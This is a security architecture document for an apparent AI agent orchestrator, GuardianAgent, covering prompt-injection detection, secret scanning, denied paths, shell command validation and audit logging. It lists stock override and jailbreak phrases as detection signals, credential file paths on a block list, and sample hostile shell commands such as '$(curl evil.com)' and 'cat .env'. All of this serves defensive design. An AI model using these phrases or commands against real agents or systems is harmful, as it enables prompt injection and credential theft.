# Security Architecture — Three-Layer Defense System

GuardianAgent's security is designed around a core insight from analyzing real AI agent incidents (see `docs/research/AI-AGENT-SECURITY-REPORT.md`): **current AI agents are dangerous because they combine processing untrusted input, accessing sensitive data, and executing system commands without adequate isolation.**

GuardianAgent **actively protects users from security mistakes** through a three-layer defense system that operates at every stage of the message lifecycle.

---

## Threat Model

GuardianAgent is a **self-contained orchestrator with curated capabilities**. The agents are TypeScript classes written by the developer and explicitly registered with the Runtime. There is no plugin marketplace, no third-party agent downloads, no sandboxed execution of untrusted code.

This means **the agent code is trusted. The LLM output is not.**

The realistic threats are:
1. **LLM-driven misbehavior** — A well-intentioned agent gets prompt-injected or the LLM hallucinates something dangerous (leaks a credential, writes to a sensitive file, generates harmful content).
2. **Developer mistakes** — An agent is given too broad a capability set, or the developer forgets to validate an action before performing it.
3. **Misconfiguration** — API keys exposed in logs, web channel left unauthenticated, overly permissive capability grants.

All three are addressed by the mandatory enforcement model described below.

---

## Mandatory Enforcement Model

All security enforcement is **mandatory at the Runtime level**. Agents cannot bypass it. The Runtime controls every chokepoint where data flows in or out of an agent:

| Chokepoint | Enforcement | Code Reference |
|------------|-------------|----------------|
| **Message input** | Guardian pipeline runs BEFORE `agent.onMessage()` is called. The agent never sees blocked messages. | `runtime.ts` — `dispatchMessage()` |
| **Response output** | After `agent.onMessage()` returns, the Runtime scans the response for secrets and redacts/blocks before it reaches anyone. | `runtime.ts` — output scanning in `dispatchMessage()` |
| **LLM access** | Agents receive a `GuardedLLMProvider` via `ctx.llm`, not the raw provider. Every LLM call is automatically scanned for secrets and tracked for token usage. | `guarded-provider.ts`, `runtime.ts` — `createAgentContext()` |
| **Event emission** | `ctx.emit()` scans all payloads for secrets before dispatch. This is the only way to send inter-agent events. | `runtime.ts` — `createAgentContext()` emit closure |
| **Connector/playbook operations** | Option 2 connector packs are declarative allowlists; execution is intended to flow through ToolExecutor + Guardian checks, not a side-channel runtime. | `config/types.ts`, `config/loader.ts`, `tools/executor.ts` |
| **Resource limits** | Concurrent invocation limits, queue depth, token rate limits, and wall-clock budgets are checked before every invocation. | `runtime.ts` — `checkConcurrentLimit()`, `checkQueueDepth()`, `checkTokenRateLimit()` |
| **Lifecycle gating** | Dead, Stalled, and Paused agents cannot receive work. Errored agents auto-recover on user messages. | `runtime.ts` — `INACTIVE_STATES`, `assertExecutable()`, `dispatchMessage()` auto-recovery |
| **Context immutability** | Agent contexts are frozen with `Object.freeze()`. Agents cannot modify their own capabilities, emit function, or LLM provider reference. | `runtime.ts` — `createAgentContext()` |

The agent's only interaction points with the system are:
- **`ctx.llm`** — Guarded (automatic secret scanning + token tracking)
- **`ctx.emit()`** — Scanned (payload secret detection)
- **Return a response** — Scanned (output secret detection + redaction)
- **`ctx.checkAction()`** — Optional self-check (convenience API, see below)

There is no `ctx.fs`, no `ctx.http`, no `ctx.exec`. Agents do not have access to Node.js APIs through the context. The Runtime mediates all external interaction.

### Agent Self-Check API (Convenience, Not Enforcement)

`ctx.checkAction()` is a **convenience method** that lets agent code proactively ask "do I have permission for X?" before attempting it. It calls `Guardian.check()` with the agent's capability set and records the result in the AuditLog.

This is useful for agents that want to validate before acting, but it is **not the enforcement boundary**. All mandatory enforcement happens at the Runtime chokepoints listed above, regardless of whether the agent calls `checkAction()`.

### SOUL Prompt Layer (Intent Alignment, Advisory)

GuardianAgent optionally injects a `SOUL.md` profile into chat-agent system prompts to keep identity, intent, and behavioral boundaries consistent across runs.

- Config path: `assistant.soul`
- Modes: `primaryMode` and `delegatedMode` (`full`, `summary`, `disabled`)
- Overhead controls: `maxChars` and `summaryMaxChars`

This layer is **advisory alignment**, not hard enforcement. Runtime Guardian controls and tool policy remain authoritative.

---

## Design Principle: Meta's Rule of Two

An agent should satisfy **at most two** of:
1. Processing untrusted inputs (user content, web pages, PDFs)
2. Accessing sensitive data (credentials, .env files, private repos)
3. Changing state / communicating externally (shell commands, API calls)

This prevents complete exploit chains. GuardianAgent enforces this structurally through capability grants and the Guardian admission pipeline.

---

## Layer 1: Proactive Guardian (Inline, Real-Time)

The admission controller pipeline runs **before** every agent invocation. Controllers execute in order — mutating phase first, then validating phase. If any controller denies the action, the entire pipeline short-circuits.

### Pipeline Order

```
Guardian.createDefault() pipeline:

MUTATING PHASE:
  1. InputSanitizer        — strip invisible Unicode, detect prompt injection

VALIDATING PHASE:
  2. RateLimiter           — burst/minute/hour windows per agent
  3. CapabilityController  — per-agent permission enforcement
  4. SecretScanController  — scan content params for 28+ credential patterns
  5. DeniedPathController  — block sensitive file paths with normalization
  6. ShellCommandController — tokenize + validate shell commands (when allowedCommands configured)
```

Wired into: `Runtime.dispatchMessage()` before `agent.onMessage()`.

### 1.1 InputSanitizer (Mutating)

**File:** `src/guardian/input-sanitizer.ts`

Detects and neutralizes prompt injection attempts. As a mutating controller, it cleans content before the validating controllers see it.

**Invisible character stripping:**
- Zero-width joiners/spaces (`U+200B–200F`)
- Bidi markers (`U+202A–202E`)
- Word joiners (`U+2060–2064`)
- Isolate markers (`U+2066–2069`)
- Byte order mark (`U+FEFF`)
- Soft hyphen (`U+00AD`)
- Various format chars (`U+034F`, `U+061C`, `U+115F`, `U+1160`, `U+17B4`, `U+17B5`, `U+180E`)

**Injection detection (18 weighted signal patterns):**

| Category | Examples | Score |
|----------|----------|-------|
| Role override | "ignore previous instructions", "you are now", "forget your instructions" | 2–3 |
| Delimiter injection | `system:`, `assistant:`, ````system` | 1–3 |
| Instruction override | "new instructions:", "override all settings" | 3 |
| Jailbreak patterns | "DAN mode", "developer mode", "jailbreak" | 2–3 |
| Data exfiltration | "repeat all above", "show me your prompt" | 2 |

Scores are additive. Default block threshold: **3** (configurable).

**Behavior:**
- Score < threshold + invisible chars found → mutate action (strip chars, pass through)
- Score ≥ threshold → deny with signal names in reason
- No content param → pass through (null)

### 1.2 RateLimiter (Validating)

**File:** `src/guardian/rate-limiter.ts`

Prevents DoS via message flooding. Uses per-agent sliding window tracking.

| Window | Default Limit | Duration |
|--------|--------------|----------|
| Burst | 5 requests | 10 seconds |
| Per-minute | 30 requests | 60 seconds |
| Per-hour | 500 requests | 3600 seconds |

Only applies to `message_dispatch` actions (not internal events or schedules).

### 1.3 CapabilityController (Validating)

**File:** `src/guardian/guardian.ts`

Maps action types to required capabilities. Agents without the required capability are denied.

| Action Type | Required Capability |
|-------------|-------------------|
| `read_file` | `read_files` |
| `write_file` | `write_files` |
| `execute_command` | `execute_commands` |
| `http_request` | `network_access` |
| `read_email` | `read_email` |
| `draft_email` | `draft_email` |
| `send_email` | `send_email` |
| `git_operation` | `git_operations` |
| `install_package` | `install_packages` |

Unknown action types pass through (allow by default for extensibility).

**Dynamic capability resolution:** Auto-registered agents (local, external, default) receive capabilities from the configured trust preset rather than hardcoded lists. This means the user's `guardian.trustPreset` selection directly controls what agents can do. For example, `locked` restricts agents to `read_files` only, while `power` grants `network_access` and all other capabilities. See [TRUST-PRESETS-SPEC.md](../specs/TRUST-PRESETS-SPEC.md) for details.

### 1.4 SecretScanController (Validating)

**File:** `src/guardian/secret-scanner.ts`

Scans content parameters for 28+ credential patterns. Blocks actions that would expose secrets.

**Detected Patterns:**

| Category | Patterns |
|----------|----------|
| AWS | Access Key (`AKIA...`), Secret Key, Session Token |
| GCP | Service Account JSON, AI API Key (`AIza...`) |
| Azure | Storage Key (connection string) |
| GitHub | Token (`ghp_`, `gho_`, `ghu_`, `ghs_`, `ghr_`), OAuth Secret, App Token |
| GitLab | PAT (`glpat-`), Pipeline Token (`glptt-`) |
| OpenAI | API Key (`sk-proj-`, `sk-...`) |
| Anthropic | API Key (`sk-ant-`) |
| Stripe | Live Key (`sk_live_`), Test Key (`sk_test_`) |
| Slack | Bot Token (`xoxb-`), Webhook |
| Twilio | API Key (`SK` + 32 hex chars) |
| SendGrid | API Key (`SG.<22>.<43>`) |
| Telegram | Bot Token (`<digits>:<alphanumeric>`) |
| npm | Token (`npm_`) |
| Heroku | API Key (UUID format after "heroku") |
| Mailgun | API Key (`key-` + 32 chars) |
| Generic | JWT (`eyJ...`), PEM Private Key headers (RSA, OPENSSH), Connection strings, Generic high-entropy secrets |

Custom patterns can be added via configuration or constructor.

### 1.5 DeniedPathController (Validating)

**File:** `src/guardian/guardian.ts`

Blocks access to sensitive file paths. Performs path normalization to prevent traversal bypasses.

**Denied Path Patterns (13):**

| Pattern | Matches |
|---------|---------|
| `.env` | `.env`, `.env.local`, `.env.production` |
| `*.pem` | `server.pem`, `ca-cert.pem` |
| `*.key` | `private.key`, `server.key` |
| `credentials` | `credentials.json`, `credentials.yaml` |
| `id_rsa` | `id_rsa`, `id_rsa.pub` |
| SSH keys | `.ssh/` directory contents |
| `*.p12`, `*.pfx` | PKCS12 keystores |
| `*.jks` | Java keystores |
| `.npmrc` | npm auth tokens |
| `*.tfvars` | Terraform variables (often contain secrets) |
| `*.tfstate` | Terraform state (contains secrets) |
| `docker-compose*.yml` | May contain inline secrets |
| `kubeconfig` | `.kube/config`, kubeconfig files |

**Path normalization:**
1. `path.normalize()` resolves `./`, `../`, double slashes
2. After normalization, checks for remaining `..` (traversal attempt → deny)
3. Then checks normalized path against denied patterns

Example: `foo/../../.env` → normalizes → detects traversal → denied.

### 1.6 ShellCommandController (Validating)

**File:** `src/guardian/shell-command-controller.ts`

Validates shell commands by tokenizing POSIX shell syntax and checking each sub-command against allowed lists. Only fires on `execute_command` actions.

**Why simple string matching isn't enough:**
A command like `ls -la && cat .env` looks safe if you only check the first word (`ls`). The shell tokenizer splits this into two commands and validates each independently.

**Tokenizer capabilities:**
- Handles single/double quoting (`echo "hello && world"` → one command, not two)
- Splits on chain operators: `&&`, `||`, `;`, `|`
- Detects redirect targets: `echo foo > .env` → checks `.env` against denied paths
- Flags subshell substitution: `$(curl evil.com)` → denied

**Validation:**
1. Tokenize the input string
2. Split into sub-commands by chain operators
3. Each sub-command name must be in `allowedCommands`
4. Each argument and redirect target checked against denied paths
5. Subshell substitutions are flagged as potentially dangerous

**Deny-by-default:** If the tokenizer can't fully parse the input (unclosed quotes, unrecognized syntax), the command is denied.

Enabled when `assistant.tools.allowedCommands` is configured in the config.

---

## Layer 2: Output Guardian (Inline, Real-Time)

The Output Guardian scans outbound content **after** agent execution but **before** it reaches the user. It operates in two places:

### 2.1 Response Scanning

**File:** `src/guardian/output-guardian.ts`
**Wired into:** `Runtime.dispatchMessage()` after `agent.onMessage()` returns

Scans LLM responses for accidentally leaked credentials.

**Behavior (configurable):**
- **Redact mode** (default): Replace each detected secret with `[REDACTED]` — user gets a useful response with sensitive parts removed
- **Block mode**: Return `[Response blocked: credential leak detected]` — user gets no response content

Redaction uses offset-based replacement (sorted descending) to preserve string positions.

### 2.2 Event Payload Scanning

**Wired into:** `ctx.emit()` in `Runtime.createAgentContext()`

Scans inter-agent event payloads before dispatch. If secrets are found:
- Event is blocked (not dispatched)
- Error thrown back to emitting agent
- `event_blocked` recorded in AuditLog

### 2.3 Audit Logging

All Layer 2 actions are recorded:
- `output_redacted` — secrets found and redacted from response
- `output_blocked` — entire response blocked (block mode)
- `event_blocked` — inter-agent event blocked

---

## Layer 3: Sentinel Agent (Retrospective, Scheduled)

**File:** `src/agents/sentinel.ts`

A first-class agent that runs on a cron schedule (default: every 5 minutes) and analyzes the AuditLog for anomalous patterns.

### Anomaly Detection Rules (Heuristic)

| Rule | Trigger | Severity |
|------|---------|----------|
| **Volume spike** | Denial count > 3x baseline (30 events) | warn (>30) / critical (>90) |
| **Capability probing** | Agent denied for ≥5 different action types | critical |
| **Repeated secret detection** | Same agent triggers secret scanner ≥3 times | critical |
| **Error storm** | >10 agent errors in analysis window | warn |
| **Critical events** | Any critical-severity event in window | critical |

All thresholds are configurable via `AnomalyThresholds`.

### LLM-Enhanced Analysis

When an LLM provider is available and anomalies are detected, the Sentinel sends the audit summary + anomalies to the LLM for deeper analysis. The LLM is prompted to look for:
1. Unusual patterns suggesting attack or compromise
2. Agents behaving outside normal patterns
3. Data exfiltration attempts
4. Privilege escalation patterns

LLM findings are recorded as `anomaly_detected` events with `source: 'llm_analysis'`.

### Real-Time Event Response

The Sentinel also listens for `guardian.critical` events for immediate response to critical security events (future: could disable agents, alert channels).

---

## AuditLog

**File:** `src/guardian/audit-log.ts`, `src/guardian/audit-persistence.ts`

In-memory ring buffer that records all security events, backed by optional SHA-256 hash-chained JSONL persistence. Foundation for Sentinel analysis and operational visibility.

**Persistence:** When enabled (default), every event is also appended to `~/.guardianagent/audit/audit.jsonl` with a SHA-256 hash chain. Each entry stores `{ event, previousHash, hash }`. This provides:
- **Crash recovery** — events survive process restarts via `rehydrate()`
- **Tamper detection** — `verifyChain()` streams the file and recomputes hashes to detect modifications
- **Non-blocking writes** — persistence is fire-and-forget from the hot path

The chain can be verified via `GET /api/audit/verify` or the web Security page.

### Event Types (14)

| Type | Description | Typical Severity |
|------|-------------|-----------------|
| `action_denied` | Guardian blocked an action | warn |
| `action_allowed` | Action passed Guardian | info |
| `secret_detected` | Secret found in content | critical |
| `output_blocked` | LLM response blocked entirely | warn |
| `output_redacted` | Secrets redacted from response | warn |
| `event_blocked` | Inter-agent event blocked | warn |
| `input_sanitized` | Invisible chars stripped from input | info |
| `rate_limited` | Rate limit hit | warn |
| `capability_probe` | Agent probed beyond its capabilities | warn |
| `policy_changed` | Config policy hash changed (old/new hash recorded, includes `changedBy` and `reason` metadata) | info |
| `anomaly_detected` | Sentinel detected anomaly | warn/critical |
| `agent_error` | Agent error (for correlation) | warn |
| `agent_stalled` | Agent stalled (for correlation) | warn |
| `integrity_checkpoint_written` | SQLite integrity checkpoint succeeded | info |

### Configuration

- **Max events:** 10,000 (configurable, ring buffer evicts oldest)
- **Queryable by:** type, agentId, severity, time window, limit
- **Summary:** `getSummary(windowMs)` aggregates stats for Sentinel

### Logging

Events are also logged to pino at appropriate levels:
- `critical` → `log.error()`
- `warn` → `log.warn()`
- `info` → `log.info()`

---

## Cryptographic Mechanisms and Integrity Hardening

GuardianAgent adds cryptographic controls in security-sensitive paths to reduce secret exposure and improve tamper detection.

### Redacted Tool-Argument Hashing

**Files:** `src/util/crypto-guardrails.ts`, `src/tools/executor.ts`, `src/tools/approvals.ts`

When a tool job is created, arguments are recursively redacted by sensitive key name and canonicalized before hashing:
- `argsHash` = SHA-256 of canonical redacted JSON
- `argsPreview` stores redacted content only (no raw secrets)
- Approval records store redacted args + `argsHash` for deterministic correlation

This preserves observability ("is this the same request?") without persisting cleartext credentials in job/approval metadata.

### Constant-Time Auth Token Comparison

**Files:** `src/util/crypto-guardrails.ts`, `src/channels/web.ts`

Web bearer token checks use `timingSafeEqual` wrappers for equal-length string comparisons. This is applied to standard API auth and SSE auth checks to reduce token oracle timing leakage.

### Privileged HMAC Tickets for Auth Mutations

**File:** `src/channels/web.ts`

Sensitive auth endpoints now require a short-lived signed privileged ticket in addition to bearer auth:
- `POST /api/auth/ticket` issues a ticket for a specific action (`auth.config`, `auth.rotate`, `auth.reveal`, `auth.revoke`)
- Ticket payload includes `action`, timestamp, and nonce, signed with HMAC-SHA256
- Default TTL is 300 seconds
- Nonces are tracked to block replay (`usedPrivilegedTicketNonces`)
- Signature and bearer comparisons use constant-time equality helpers
- If auth mode is `disabled`, ticket minting is localhost-only

This constrains high-impact auth control-plane operations to explicit, action-scoped, single-use authorization artifacts.

### Policy Hash Audit Trail

**File:** `src/index.ts`

Configuration writes compute deterministic SHA-256 hashes of the previous and next raw config:
- `oldPolicyHash`
- `newPolicyHash`

If hashes differ, Runtime records a `policy_changed` audit event with `changedBy` and `reason` metadata, creating an immutable change trail tied to the existing audit persistence chain.

### SQLite Integrity Checkpoints

**Files:** `src/runtime/sqlite-security.ts`, `src/index.ts`

SQLite monitoring now includes periodic cryptographic checkpoints:
- Run `PRAGMA quick_check` on startup and schedule
- On integrity success, write checkpoint row (`integrity_checkpoints` table) with SHA-256 hash of DB bytes
- Attempt WAL truncate checkpoint before hashing (best effort)
- Emit `integrity_checkpoint_written` / `integrity_checkpoint_failed` security events

This supplements point-in-time integrity checks with historical hash evidence for storage drift/tamper investigations.

---

## Compute Budgets

Every agent has per-invocation resource limits:
- **maxInvocationBudgetMs:** Wall-clock time per invocation
- **maxTokensPerMinute:** LLM token rate limit (tracked per agent)
- **maxConcurrentTools:** Limit on parallel tool executions
- **maxQueueDepth:** Backpressure on event bus

Budget overruns are recorded for observability.

## Agent State Isolation

- Each agent has its own state (class instance), not shared with other agents
- Inter-agent communication only through the typed EventBus
- Events are serializable values (no shared references)
- Agent contexts are read-only — agents cannot mutate runtime state
- Event payloads are scanned for secrets before dispatch

## Stall Detection

The watchdog monitors agent activity timestamps:
1. Track `lastActivityMs` — updated on each invocation start/end
2. After `maxStallDurationMs` (default 60s) with no activity → transition to Stalled
3. After consecutive errors → exponential backoff before retry
4. After max retries (5) → transition to Dead

## Error Handling

- Agent handler errors are caught by the runtime
- Errors trigger state transition to Errored (not crash)
- Errors recorded in AuditLog as `agent_error` events
- Exponential backoff: [30s, 1m, 5m, 15m, 60m]
- After max retries, agent transitions to Dead
- **Auto-recovery on user messages:** When a user sends a message to an errored agent, the runtime automatically transitions it back to Ready before dispatching. This prevents "cannot accept work in state 'errored'" dead-ends — the user gets the actual underlying error instead, and the agent gets another chance to recover (e.g., after a config fix)

---

## Configuration

All security features are configurable in `config.yaml`:

```yaml
guardian:
  enabled: true
  logDenials: true
  additionalSecretPatterns:
    - 'CUSTOM_[A-Z]{10}'

  inputSanitization:
    enabled: true
    blockThreshold: 3       # injection score to block

  rateLimit:
    maxPerMinute: 30
    maxPerHour: 500
    burstAllowed: 5

  outputScanning:
    enabled: true
    redactSecrets: true     # false = block entire response

  sentinel:
    enabled: true
    schedule: '*/5 * * * *'

  auditLog:
    maxEvents: 10000
    persistenceEnabled: true              # default: true
    auditDir: ~/.guardianagent/audit/     # default

  # Trust presets: one-line security posture (locked | safe | balanced | power)
  # trustPreset: balanced
```

### Trust Presets

Instead of tuning each field individually, set a trust preset for a complete security posture:

```yaml
guardian:
  trustPreset: locked    # locked | safe | balanced | power
```

| Preset | Capabilities | Rate Limit | Tool Policy |
|--------|-------------|------------|-------------|
| **locked** | read_files only | 10/min, 100/hr | approve_each |
| **safe** | read_files, read_email | 20/min, 300/hr | approve_by_policy |
| **balanced** | read/write/exec/git/email | 30/min, 500/hr | approve_by_policy |
| **power** | all capabilities | 60/min, 2000/hr | autonomous |

Priority: user explicit config > preset > defaults. See [TRUST-PRESETS-SPEC.md](../specs/TRUST-PRESETS-SPEC.md).

### Connector + Playbook Policy (Option 2)

```yaml
assistant:
  connectors:
    enabled: true
    executionMode: plan_then_execute
    maxConnectorCallsPerRun: 12
    packs:
      - id: infra-core
        name: Infrastructure Core
        enabled: true
        authMode: oauth2
        allowedCapabilities: [inventory.read, vm.power.write]
        allowedHosts: [10.10.0.5, bms-gateway.local]
        allowedPaths: [./workspace]
        allowedCommands: [ssh, ansible-playbook]
        requireHumanApprovalForWrites: true
    playbooks:
      enabled: true
      maxSteps: 12
      maxParallelSteps: 3
      defaultStepTimeoutMs: 15000
      requireSignedDefinitions: true
      requireDryRunOnFirstExecution: true
    studio:
      enabled: true
      mode: builder
      requirePrivilegedTicket: true
```

This keeps automation scoped by explicit allowlists and approval requirements while preserving existing Guardian and audit controls.

---

## Extensibility

### Custom Admission Controllers

```typescript
guardian.use({
  name: 'MyController',
  phase: 'validating',
  check: (action) => {
    if (action.params.blocked) {
      return { allowed: false, reason: 'Custom denial', controller: 'MyController' };
    }
    return null; // pass through
  },
});
```

### Custom Secret Patterns

```typescript
const scanner = new SecretScanner(['CUSTOM_[A-Z]{10}']);
```

Or via config:

```yaml
guardian:
  additionalSecretPatterns:
    - 'MYTOKEN_[A-Za-z0-9]{32}'
```

### Custom Anomaly Thresholds

```typescript
const sentinel = new SentinelAgent({
  volumeSpikeMultiplier: 5,
  capabilityProbeThreshold: 3,
  secretDetectionThreshold: 2,
});
```

---

## Orchestration Security

Structured orchestration agents (SequentialAgent, ParallelAgent, LoopAgent) introduce new security surfaces. The key architectural decision is that **all sub-agent dispatches go through the full Guardian pipeline**.

### How Security Is Preserved

1. **`ctx.dispatch()` wraps `Runtime.dispatchMessage()`** — not a raw method call. Every sub-agent invocation passes through InputSanitizer → RateLimiter → CapabilityController → SecretScanController → DeniedPathController → ShellCommandController.

2. **Output scanning on every response** — Each sub-agent's response is scanned by OutputGuardian before the orchestrating agent receives it. Secrets are redacted before they enter SharedState.

3. **Budget enforcement** — The orchestrating agent's `maxInvocationBudgetMs` caps total wall-clock time for the entire pipeline. Each sub-agent also has its own per-invocation budget.

4. **Rate limiting accumulates** — Each sub-agent dispatch counts against that sub-agent's rate limit. A 10-step pipeline with 30 req/min limit will be throttled after 30 total dispatches across all steps.

### Identified Risks

| Risk | Severity | Mitigation | Residual |
|------|----------|-----------|----------|
| Dispatch loops (A→B→A) | Medium | Budget timeout kills chain | Deep stacks before timeout |
| Amplification (1 msg → N calls) | Medium | Rate limiting per sub-agent | Config-time step count not limited |
| State poisoning (crafted responses) | Medium | InputSanitizer + OutputGuardian | Sophisticated indirect injection |
| Capability escalation | Low | Sub-agent capabilities checked independently | Intentional — delegation is the point |
| Nested orchestration depth | Medium | Budget timeout on outermost | No explicit depth counter |
| Resource exhaustion | Medium | Budget/token/queue limits | ParallelAgent can spike concurrent load |

### Open Problems

1. **Indirect prompt injection through state** — A compromised sub-agent can craft its response to inject instructions into the next step's input. The InputSanitizer catches common patterns but cannot prevent all sophisticated injection.

2. **No dispatch depth tracking** — Recursion depth is limited only by budget timeouts, not an explicit counter. A future `maxDispatchDepth` field in context would provide a hard cap.

3. **No step count limits** — An orchestration agent could be configured with arbitrarily many steps. A configuration-time validation for `maxStepsPerOrchestration` would add defense.

See [ORCHESTRATION-AGENTS-SPEC.md](../specs/ORCHESTRATION-AGENTS-SPEC.md) for the complete security analysis.

---

## MCP Security

The MCP client connects to external tool servers via child processes. This introduces a process-boundary trust boundary.

### Trust Boundary

```
┌─────────────────────────────┐    stdio    ┌──────────────────┐
│  GuardianAgent (trusted)    │◄───────────►│  MCP Server      │
│                             │             │  (untrusted)     │
│  Guardian validates BEFORE  │             │                  │
│  calling MCP tools          │             │  Has OS-level    │
│                             │             │  process access  │
└─────────────────────────────┘             └──────────────────┘
```

### Mitigations

1. **Tool name namespacing** — MCP tools are prefixed `mcp:<serverId>:<toolName>`, preventing collision with built-in tools
2. **Guardian validates tool calls** — Arguments are scanned for secrets before being sent to the MCP server
3. **Response scanning** — MCP tool results pass through OutputGuardian
4. **Scoped environment** — `config.env` explicitly controls what environment variables the server process sees
5. **Request timeouts** — Configurable per-server timeout prevents hanging

### Known Gaps

1. **Process isolation** — The MCP server process has the same OS-level permissions as GuardianAgent. It can read files, environment variables, and make network connections. Container or sandbox isolation is recommended for production.

2. **No response size limits** — A malicious server could return arbitrarily large responses. Content-Length enforcement is planned.

3. **No reconnection** — Server crashes leave the client in `disconnected` state. Automatic reconnection with backoff is planned.

See [MCP-CLIENT-SPEC.md](../specs/MCP-CLIENT-SPEC.md) for the complete security analysis.

---

## Connector + Playbook Security (Option 2)

Connector packs and playbooks add workflow flexibility without adding a parallel trust model.

### Security Posture

1. **Pack boundaries are explicit** — each pack limits capabilities, hosts, paths, and commands.
2. **Execution remains policy-gated** — mutating operations are still approval-governed via existing tool policy/Guardian checks.
3. **Step budgets are mandatory** — max steps, max parallelism, and per-step timeouts constrain blast radius.
4. **Studio mutations are ticket-gated** — connector/playbook config mutations require privileged auth tickets when studio policy enables it.
5. **Audit continuity is preserved** — connector-triggered actions remain traceable through existing hash-chained audit logging and policy hash events.

See [CONNECTOR-PLAYBOOK-FRAMEWORK-SPEC.md](../specs/CONNECTOR-PLAYBOOK-FRAMEWORK-SPEC.md).

---

## Evaluation Security

The evaluation framework runs through the real Runtime with all security layers active.

### Design Decision: No Eval Mode

There is no "evaluation mode" that disables security. If Guardian blocks an eval input, that is a **meaningful test result** — it tells you the security posture would block that interaction in production.

### Risks

- **Secrets in test data** — `.eval.json` files must be reviewed like code. Do not use production credentials.
- **Rate limit consumption** — Large eval suites consume rate limit budget. Use dedicated test configurations with higher limits.
- **Result sensitivity** — Eval results contain full response content. The OutputGuardian redacts secrets before the runner receives responses.

See [EVAL-FRAMEWORK-SPEC.md](../specs/EVAL-FRAMEWORK-SPEC.md) for details.
